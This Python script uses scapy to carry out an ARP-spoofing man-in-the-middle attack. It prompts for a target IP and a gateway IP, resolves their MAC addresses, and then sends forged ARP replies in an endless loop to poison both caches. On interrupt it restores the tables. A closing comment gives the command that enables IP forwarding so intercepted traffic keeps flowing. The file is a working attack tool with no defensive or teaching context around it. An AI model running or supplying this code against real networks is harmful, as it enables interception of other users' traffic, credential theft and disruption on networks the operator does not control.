
from scapy.all import *

def getmac(targetip):
	arppacket= Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=targetip)
	targetmac= srp(arppacket, timeout=2 , verbose= False)[0][0][1].hwsrc
	return targetmac

def spoofarpcache(targetip, targetmac, sourceip):
	spoofed= ARP(op=2 , pdst=targetip, psrc=sourceip, hwdst= targetmac)
	send(spoofed, verbose= False)

def restorearp(targetip, targetmac, sourceip, sourcemac):
	packet= ARP(op=2 , hwsrc=sourcemac , psrc= sourceip, hwdst= targetmac , pdst= targetip)
	send(packet, verbose=False)
	print ("ARP Table restored to normal for", targetip)

def main():
	targetip= input("Enter Target IP:")
	gatewayip= input("Enter Gateway IP:")

	try:
		targetmac= getmac(targetip)
		print ("Target MAC", targetmac)
	except:
		print ("Target machine did not respond to ARP broadcast")
		quit()

	try:
		gatewaymac= getmac(gatewayip)
		print ("Gateway MAC:", gatewaymac)
	except:
		print ("Gateway is unreachable")
		quit()
	try:
		print ("Sending spoofed ARP responses")
		while True:
			spoofarpcache(targetip, targetmac, gatewayip)
			spoofarpcache(gatewayip, gatewaymac, targetip)
	except KeyboardInterrupt:
		print ("ARP spoofing stopped")
		restorearp(gatewayip, gatewaymac, targetip, targetmac)
		restorearp(targetip, targetmac, gatewayip, gatewaymac)
		quit()

if __name__=="__main__":
	main()

# To enable IP forwarding: echo 1 > /proc/sys/net/ipv4/ip_forward